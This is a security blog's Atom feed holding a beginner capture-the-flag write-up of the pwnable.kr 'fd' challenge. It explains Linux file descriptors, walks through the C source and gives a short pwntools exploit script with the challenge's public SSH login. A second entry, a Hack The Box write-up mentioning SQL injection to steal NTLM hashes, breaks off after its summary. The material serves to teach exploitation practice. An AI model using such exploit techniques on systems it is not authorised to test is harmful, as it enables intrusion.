<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-02-19T00:34:27+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">pwnable.kr - fd , Understanding Linux File Descriptors and creating a simple exploit with python pwntools</title><link href="http://localhost:4000/pwn/fd/" rel="alternate" type="text/html" title="pwnable.kr - fd , Understanding Linux File Descriptors and creating a simple exploit with python pwntools" /><published>2019-02-19T00:00:00+02:00</published><updated>2019-02-19T00:00:00+02:00</updated><id>http://localhost:4000/pwn/fd</id><content type="html" xml:base="http://localhost:4000/pwn/fd/">&lt;hr /&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys--lately-i-have-been-doing-pwn-challenges-and-i-decided-to-share-some-stuff-with-you-from-time-to-time-like-i-do-with-the-other-write-ups-today-we-will-solve-fd-from-pwnablekr--its-a-very-easy-one-but-as-always-we-will-go-in-detail&quot;&gt;Hey guys , Lately I have been doing pwn challenges and I decided to share some stuff with you from time to time like I do with the other write-ups. Today we will solve fd from pwnable.kr , it’s a very easy one but as always we will go in detail.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;pwn means to compromise or control, specifically another computer (server or PC), website, gateway device, or application. It is synonymous with one of the definitions of hacking or cracking.
-&lt;a href=&quot;https://en.wikipedia.org/wiki/Pwn&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/images/pwn/fd/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Mommy! what is a file descriptor in Linux?
ssh fd@pwnable.kr -p2222 (pw:guest)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-have-ssh-login-info-and-some-sort-of-a-hint--before-doing-anything-lets-talk-about-file-descriptors--because-thats-what-the-hint-said&quot;&gt;We have ssh login info, and some sort of a hint , before doing anything let’s talk about file descriptors , because that’s what the hint said.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;file-descriptors&quot;&gt;File descriptors&lt;/h3&gt;
&lt;h4 id=&quot;file-descriptors-simply-are-indicators-or-handles-used-to-access-a-file-or-io-inputoutput-resource--file-descriptors-are-represented-in-c-as-integers-and-there-are-3-types-of-file-descriptors-&quot;&gt;File descriptors simply are indicators or handles used to access a file or i/o (input/output) resource , File descriptors are represented in &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; as integers and there are 3 types of file descriptors :&lt;/h4&gt;
&lt;h4 id=&quot;standard-input-stdin--its-integer-value-is-0&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;standard input&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt;) , its integer value is &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;standard-output-stdout--its-integer-value-is-1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;standard output&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt;) , its integer value is &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;standard-error-stderr--its-integer-value-is-2&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;standard error&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;stderr&lt;/code&gt;) , its integer value is &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;to-summarize-this-up--when-you-run-a-program-and-give-it-arguments-through-sysargv-for-example--thats-stdin--whatever-the-program-gives-you-back-as-an-output--thats-stdout--if-the-program-gave-you-an-error--because-you-missed-a-required-argument-or-gave-it-a-wrong-argument-for-example--thats-stderr&quot;&gt;To summarize this up , when you run a program and give it arguments through &lt;code class=&quot;highlighter-rouge&quot;&gt;sys.argv&lt;/code&gt; for example , that’s &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; , whatever the program gives you back as an output , that’s &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt; . If the program gave you an error , because you missed a required argument or gave it a wrong argument for example , that’s &lt;code class=&quot;highlighter-rouge&quot;&gt;stderr&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;source-analysis&quot;&gt;Source analysis&lt;/h3&gt;
&lt;h4 id=&quot;after-we-ssh-to-the-server-ssh-fdpwnablekr--p2222--password--guest-we-find-3-files&quot;&gt;After we &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; to the server (&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh fd@pwnable.kr -p2222&lt;/code&gt; , password : &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt;) we find 3 files&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;fd--fdc-and-flag&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;fd.c&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;fd-is-an-executable--and-fdc-is-the-source-of-that-executable&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; is an executable , and &lt;code class=&quot;highlighter-rouge&quot;&gt;fd.c&lt;/code&gt; is the source of that executable&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-dont-have-permissions-to-view-flag-&quot;&gt;And we don’t have permissions to view &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-source-&quot;&gt;Let’s take a look at the source :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc&amp;lt;2){
                printf(&quot;pass argv[1] a number\n&quot;);
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
                printf(&quot;good job :)\n&quot;);
                system(&quot;/bin/cat flag&quot;);
                exit(0);
        }
        printf(&quot;learn about Linux file IO\n&quot;);
        return 0;

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;breakdown-&quot;&gt;Breakdown :&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;char buf[32];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-assigns-a-buffer-of-32-chars-to-the-variable-buf&quot;&gt;This assigns a buffer of 32 chars to the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(argc&amp;lt;2){
                printf(&quot;pass argv[1] a number\n&quot;);
                return 0;
        }

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;here-it-starts-by-checking-if-we-passed-and-argument-or-not--and-if-we-didnt--it-will-print-pass-argv1-a-number&quot;&gt;Here it starts by checking if we passed and argument or not , and if we didn’t , it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;pass argv[1] a number&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int fd = atoi( argv[1] ) - 0x1234;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-it-defines-a-variable-called-fd--the-value-of-that-variable-is-atoi-argv1----0x1234-atoi-is-a-function-in-c-that-converts-a-string-into-an-integer--it-stands-for-ascii-to-integer--0x1234-is-the-hex-of-4660&quot;&gt;Then it defines a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; , the value of that variable is &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi( argv[1] ) - 0x1234&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi()&lt;/code&gt; is a function in &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; that converts a string into an integer , it stands for &lt;code class=&quot;highlighter-rouge&quot;&gt;Ascii to Integer&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1234&lt;/code&gt; is the hex of &lt;code class=&quot;highlighter-rouge&quot;&gt;4660&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-it-subtracts-4660-from-our-input&quot;&gt;So it subtracts 4660 from our input.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int len = 0;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-defines-a-variable-called-len-and-assigns-a-value-of-0-to-it&quot;&gt;This defines a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;len&lt;/code&gt; and assigns a value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; to it&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        len = read(fd, buf, 32);
        if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
                printf(&quot;good job :)\n&quot;);
                system(&quot;/bin/cat flag&quot;);
                exit(0);
        }
        printf(&quot;learn about Linux file IO\n&quot;);
        return 0;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;here-its-taking-fd-and-also-reading-our-input-and-puts-it-into-buf--then-theres-an-if-statement-which-checks-if-the-value-of-buf-is-letmein--if-its-then-it-will-print-good-job-and-give-us-the-flag--but-if-its-not-it-will-print-learn-about-linux-file-io&quot;&gt;Here it’s taking &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; and also reading our input and puts it into &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; , then there’s an if statement which checks if the value of buf is &lt;code class=&quot;highlighter-rouge&quot;&gt;LETMEIN&lt;/code&gt; , if it’s then it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;good job&lt;/code&gt; and give us the flag , but if it’s not it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;learn about Linux file IO&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;h4 id=&quot;now-we-have-an-idea-about-the-logic-of-the-program--and-a-pwn-challenge-is-all-about-breaking-that-logic&quot;&gt;Now we have an idea about the logic of the program , and a pwn challenge is all about breaking that logic.&lt;/h4&gt;
&lt;h4 id=&quot;lets-run-the-program-just-to-test-&quot;&gt;Let’s run the program just to test :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./fd 1337&lt;/code&gt;
&lt;img src=&quot;/images/pwn/fd/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-prints-learn-about-linux-file-io--because-we-didnt-get-fd-right-we-know-that-fd-is-an-abbreviation-for-file-descriptor--and-there-are-3-file-descriptors-stdin-stdout-stderr--and-we-can-also-control-the-value-of-fd-because-we-know-that-its-subtracting-4660-from-argv1-and-we-control-argv1--how-are-we-giving-the-program-argv1--through-stdin-which-is-represented-by-0--so-if-we-gave-the-program-4660--fd--4660---4660--fd--0-lets-try-it&quot;&gt;It prints &lt;code class=&quot;highlighter-rouge&quot;&gt;learn about Linux file IO&lt;/code&gt; , because we didn’t get &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; right. We know that &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; is an abbreviation for file descriptor , and there are 3 file descriptors &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;stderr&lt;/code&gt; , And we can also control the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; because we know that it’s subtracting 4660 from &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; and we control &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; , how are we giving the program &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; ? Through &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; which is represented by &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; , so if we gave the program &lt;code class=&quot;highlighter-rouge&quot;&gt;4660&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;fd = 4660 - 4660&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;fd = 0&lt;/code&gt;. Let’s try it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-it-didnt-print-learn-about-linux-file-io--instead-of-that-its-reading-our-input--len--readfd-buf-32&quot;&gt;Now it didn’t print &lt;code class=&quot;highlighter-rouge&quot;&gt;learn about Linux file IO&lt;/code&gt; , instead of that it’s reading our input –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;len = read(fd, buf, 32);&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-knew-earlier-that-we-have-to-make-buf--letmewin-to-execute-the-first-if-condition-&quot;&gt;We knew earlier that we have to make buf = “LETMEWIN” to execute the first &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; condition :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-the-flag--mommy-i-think-i-know-what-a-file-descriptor-is&quot;&gt;And we got the flag : “mommy! I think I know what a file descriptor is!!”&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploitation-with-python-pwntools&quot;&gt;Exploitation with python pwntools&lt;/h3&gt;
&lt;h4 id=&quot;we-will-use-a-python-library-called-pwntools-to-create-an-exploit-read-the-documentation-here&quot;&gt;We will use a python library called pwntools to create an exploit. Read the documentation &lt;a href=&quot;http://docs.pwntools.com/en/stable/about.html&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-will-import-the-pwntools-library-&quot;&gt;We will import the pwntools library :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;from pwn import *&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-set-up-an-ssh-connection-to-the-server-&quot;&gt;Then we will set up an &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; connection to the server :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222)&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;fd-is-the-username--pwnablekr-is-the-host&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; is the username , &lt;code class=&quot;highlighter-rouge&quot;&gt;pwnable.kr&lt;/code&gt; is the host&lt;/h4&gt;
&lt;h4 id=&quot;after-that-we-will-start-a-process-to-execute-fd-4660&quot;&gt;After that we will start a process to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;./fd 4660&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;process = shell.process(executable='./fd', argv=['fd','4660'])&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-we-will-send-letmewin-and-read-the-output&quot;&gt;And finally we will send &lt;code class=&quot;highlighter-rouge&quot;&gt;LETMEWIN&lt;/code&gt; and read the output&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;process.sendline('LETMEWIN')&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;print process.recv()&lt;/code&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;final-script-&quot;&gt;Final script :&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'fd'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pwnable.kr'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'guest'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2222&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;executable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./fd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'fd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'4660'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'LETMEWIN'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-try-it-&quot;&gt;Let’s try it :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./exploit.py&lt;/code&gt;
&lt;img src=&quot;/images/pwn/fd/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-its-working-&quot;&gt;And it’s working !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-other-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;other write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction Hey guys , Lately I have been doing pwn challenges and I decided to share some stuff with you from time to time like I do with the other write-ups. Today we will solve fd from pwnable.kr , it’s a very easy one but as always we will go in detail. pwn means to compromise or control, specifically another computer (server or PC), website, gateway device, or application. It is synonymous with one of the definitions of hacking or cracking. -Wikipedia Challenge Description Mommy! what is a file descriptor in Linux? ssh fd@pwnable.kr -p2222 (pw:guest) We have ssh login info, and some sort of a hint , before doing anything let’s talk about file descriptors , because that’s what the hint said. File descriptors File descriptors simply are indicators or handles used to access a file or i/o (input/output) resource , File descriptors are represented in c as integers and there are 3 types of file descriptors : standard input (stdin) , its integer value is 0 standard output (stdout) , its integer value is 1 standard error (stderr) , its integer value is 2 To summarize this up , when you run a program and give it arguments through sys.argv for example , that’s stdin , whatever the program gives you back as an output , that’s stdout . If the program gave you an error , because you missed a required argument or gave it a wrong argument for example , that’s stderr. Source analysis After we ssh to the server (ssh fd@pwnable.kr -p2222 , password : guest) we find 3 files fd , fd.c and flag. fd is an executable , and fd.c is the source of that executable And we don’t have permissions to view flag : Let’s take a look at the source : #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&amp;lt;2){ printf(&quot;pass argv[1] a number\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){ printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\n&quot;); return 0; } Breakdown : char buf[32]; This assigns a buffer of 32 chars to the variable buf if(argc&amp;lt;2){ printf(&quot;pass argv[1] a number\n&quot;); return 0; } Here it starts by checking if we passed and argument or not , and if we didn’t , it will print pass argv[1] a number int fd = atoi( argv[1] ) - 0x1234; Then it defines a variable called fd , the value of that variable is atoi( argv[1] ) - 0x1234. atoi() is a function in c that converts a string into an integer , it stands for Ascii to Integer , 0x1234 is the hex of 4660 So it subtracts 4660 from our input. int len = 0; This defines a variable called len and assigns a value of 0 to it len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){ printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\n&quot;); return 0; Here it’s taking fd and also reading our input and puts it into buf , then there’s an if statement which checks if the value of buf is LETMEIN , if it’s then it will print good job and give us the flag , but if it’s not it will print learn about Linux file IO. Exploitation Now we have an idea about the logic of the program , and a pwn challenge is all about breaking that logic. Let’s run the program just to test : ./fd 1337 It prints learn about Linux file IO , because we didn’t get fd right. We know that fd is an abbreviation for file descriptor , and there are 3 file descriptors stdin stdout stderr , And we can also control the value of fd because we know that it’s subtracting 4660 from argv[1] and we control argv[1] , how are we giving the program argv[1] ? Through stdin which is represented by 0 , so if we gave the program 4660 , fd = 4660 - 4660 , fd = 0. Let’s try it. Now it didn’t print learn about Linux file IO , instead of that it’s reading our input –&amp;gt; len = read(fd, buf, 32); We knew earlier that we have to make buf = “LETMEWIN” to execute the first if condition : And we got the flag : “mommy! I think I know what a file descriptor is!!” Exploitation with python pwntools We will use a python library called pwntools to create an exploit. Read the documentation here We will import the pwntools library : from pwn import * Then we will set up an ssh connection to the server : shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222) fd is the username , pwnable.kr is the host After that we will start a process to execute ./fd 4660 process = shell.process(executable='./fd', argv=['fd','4660']) And finally we will send LETMEWIN and read the output process.sendline('LETMEWIN') print process.recv() Final script : #!/usr/bin/python from pwn import * shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222) process = shell.process(executable='./fd', argv=['fd','4660']) process.sendline('LETMEWIN') print process.recv() Let’s try it : ./exploit.py And it’s working ! That’s it , Feedback is appreciated ! Don’t forget to read the other write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/pwn/fd/0.png" /></entry><entry><title type="html">Hack The Box - Giddy</title><link href="http://localhost:4000/hack-the-box/giddy/" rel="alternate" type="text/html" title="Hack The Box - Giddy" /><published>2019-02-16T00:00:00+02:00</published><updated>2019-02-16T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/giddy</id><content type="html" xml:base="http://localhost:4000/hack-the-box/giddy/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-giddy-retired-and-this-is-my-write-up-giddy-was-a-nice-windows-box--this-box-had-a-nice-sqli-vulnerability-which-we-will-use-to-steal-ntlm-hashes-and-login--then-the-privilege-escalation-was-a-local-privilege-escalation-vulnerability-in-a-software-called-ubiquiti-unifi-video-which-also-was-a-cool-vulnerability--i-had-fun-doing-this-box-as-it-was-a-challenging-one-its-a-windows-box-and-its-ip-is-101010104--i-added-it-to-etchosts-as-giddyhtb-lets-jump-right-in&quot;&gt;Hey guys today Giddy retired and this is my write-up. Giddy was a nice windows box , This box had a nice sqli vulnerability which we will use to steal ntlm hashes and login , Then the privilege escalation was a Local Privilege Escalation vulnerability in a software called Ubiquiti UniFi Video which also was a cool vulnerability , I had fun doing this box as it was a challenging one. It’s a windows box and its ip is 10.10.10.104 , I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;giddy.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
